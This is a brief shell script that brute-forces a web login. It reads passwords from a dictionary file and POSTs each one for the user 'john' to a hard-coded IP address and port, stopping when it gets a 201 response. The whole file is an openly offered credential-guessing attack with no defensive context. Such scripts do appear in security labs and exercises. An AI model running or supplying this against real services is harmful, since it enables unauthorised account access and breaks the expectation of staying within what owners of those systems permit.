#!/bin/sh

filename="dictionary.txt"
while read -r input_line; do
    echo ">>""$input_line"
    data='{"username":"john","password":"'$input_line'" }'
    status=$(curl -X POST --data "$data" http://178.63.53.42:8080/login)
    echo "Status : " "$status"

    if [ $status -eq 201 ]
    then
    	echo "** Password Find! **"
    	echo "Password : "$input_line
        break
    fi

done < "$filename"
